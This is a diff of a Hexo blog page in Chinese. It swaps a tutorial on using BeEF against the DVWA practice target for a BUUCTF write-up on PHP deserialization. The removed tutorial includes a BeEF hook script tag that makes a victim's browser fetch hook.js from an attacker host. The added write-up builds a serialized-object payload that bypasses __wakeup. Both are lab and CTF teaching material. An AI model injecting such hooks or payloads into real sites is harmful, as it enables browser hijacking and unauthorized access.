@@ -10,8 +10,8 @@
 
     <!--Description-->
     
-        <meta name="description" content="@TOC
-beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏">
+        <meta name="description" content="buuctf_php我们来看下这道题，打开后有提示备份文件，对于备份文件我们可以使用御剑扫描后台目录下载这个www.zip后发现有这些文件，首先打开flag.php，发现不是我们想要的flag，所以我们打开class.php，
+123456789101112131415161718192021222">
     
 
     <!--Author-->
@@ -21,7 +21,7 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="beef"/>
+        <meta property="og:title" content="buuctf_php"/>
     
 
     <!--Open Graph Description-->
@@ -46,7 +46,7 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
 
     <!-- Title -->
     
-    <title>beef - Hexo</title>
+    <title>buuctf_php - Hexo</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -152,13 +152,13 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/2021/07/25/beef/">
-                beef
+            <a href="/2021/08/08/buuctf_php/">
+                buuctf_php
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2021-07-25</span>
+                <span class="date">2021-08-08</span>
             
             
             
@@ -171,18 +171,11 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
         
 
         <!-- Post Content -->
-        <p>@<a href="beef">TOC</a></p>
-<h2 id="beef概念"><a href="#beef概念" class="headerlink" title="beef概念"></a>beef概念</h2><p>一、BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。<br>BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。</p>
-<h2 id="beef的安装"><a href="#beef的安装" class="headerlink" title="beef的安装"></a>beef的安装</h2><p>对于Windows下安装比较费力，所以直接在kali中安装。<br>1、输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install beef-xss</span><br></pre></td></tr></table></figure>
-<p>即可开始安装<br>2.安装结束后可以查看打开</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo beef-xss</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/5fdfd5ae5824401fa985ee42868737e9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b39b7e90f63c452eb0f4564972d3c0d8.png" alt="在这里插入图片描述"><br>这就是上文提到的hook，是beef中非常重要的东西。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook:&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="beef的使用"><a href="#beef的使用" class="headerlink" title="beef的使用"></a>beef的使用</h2><p>下面让我们进行一些操作。我们知道beef监听的是端口号为：3000。<br>我们可以打开kali当中的文件系统</p>
-<p><img src="https://img-blog.csdnimg.cn/eca4cf655793410e89bb3acdc5b7587c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开config.yaml，在这个里面我们可以修改他所绑定的ip地址成自己的ip<br><img src="https://img-blog.csdnimg.cn/ba6e12f0088c43398dfb1ad9785cc9ae.png" alt="在这里插入图片描述"><br>即host。</p>
-<h2 id="beef的实战"><a href="#beef的实战" class="headerlink" title="beef的实战"></a>beef的实战</h2><p>最后让我们进行beef的实战吧！<br><img src="https://img-blog.csdnimg.cn/f7fd8a8d3bc8433eb706f266b01c7df1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在kali下使用phpstudy打开dvwa靶场，选择low级别的<br><img src="https://img-blog.csdnimg.cn/30ba1985e7bd4281ac9e126d1512a197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为beef一般针对xss漏洞，所以选择这道题，Name是test，而Message是上面的Hook<br><img src="https://img-blog.csdnimg.cn/3de473d28e0d4f13958648011e218f1d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>会出现这种情况，是因为文本框被限制了，我们只需要右击，然后检查元素<br><img src="https://img-blog.csdnimg.cn/ebf924a1fb89404d9b309ed2c06879ae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改最大长度，再输入Hook的内容。<br>打开网址<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BE%93%E5%85%A5%E5%88%9A%E6%89%8D%E7%9A%84%E5%AF%86%E7%A0%81">http://127.0.0.1:3000/ui/panel，然后输入刚才的密码</a><br><img src="https://img-blog.csdnimg.cn/cb41572a97e0401aa6c5a9e4928b0e0f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绿色对目标主机生效并且不可见(不会被发现)<br>橙色对目标主机生效但可能可见(可能被发现)<br>灰色对目标主机来必生效(可验证下)<br>红色对目标主机不生效</p>
-<p>下面我们进行一个测试<br><img src="https://img-blog.csdnimg.cn/e3037b56194a4b7c806ab787d43be145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击，然后点击Excute，弹窗出现<br><img src="https://img-blog.csdnimg.cn/ae5718d81be94d4ca217d257ce3bbfd3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+        <h1 id="buuctf-php"><a href="#buuctf-php" class="headerlink" title="buuctf_php"></a>buuctf_php</h1><p><img src="https://img-blog.csdnimg.cn/83ed7f7f9b4947a98b422d117f12f4f8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们来看下这道题，打开后有提示备份文件，对于备份文件我们可以使用御剑扫描后台目录<br><img src="https://img-blog.csdnimg.cn/b4ec4bc346c84b18a315e7f988807dcc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载这个<a target="_blank" rel="noopener" href="http://www.zip后发现/">www.zip后发现</a><br><img src="https://img-blog.csdnimg.cn/1b9a8035097d49d3a039e87b97e7a05a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有这些文件，首先打开flag.php，发现不是我们想要的flag，所以我们打开class.php，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    private $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    private $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;username;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;password;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span> $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先我们注意关于username和password都是private，这个在下面的解答中会用到<br><img src="https://img-blog.csdnimg.cn/bd528dc12f7349cb9d115330f452f4f5.png" alt="在这里插入图片描述"><br>然后打开index.php观察这个代码，由unserialize()知涉及反序列化，再打开class.php<br><img src="https://img-blog.csdnimg.cn/8e60ca21b74e45379725cf6c5620e08f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以知道只有username为admin时且password为100时，才会输出flag<br>而反序列化后调用_wakeup会直接覆盖输入的用户名。一个简单的办法是直接在class下面创建一个对象然后序列化。由此我们可以构造playload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a= new Name(&#x27;admin&#x27;,100);</span><br><span class="line">$b= serialize($a);</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure>
+<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>此时我们需要注意两个点，一个是private属性序列化:%00类名%00成员名，所有要在Name、username、以及password前面加%00，另一个是关于_wakeup函数，因为要绕过wakeup,把Name后的数字改成3，**当反序列化时，若属性个数大于真实属性个数时，则会跳过__wakeup()**，本题得解<br><img src="https://img-blog.csdnimg.cn/17a850d19ba44de6bd1e46f0ba2a722a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
     </div>
 
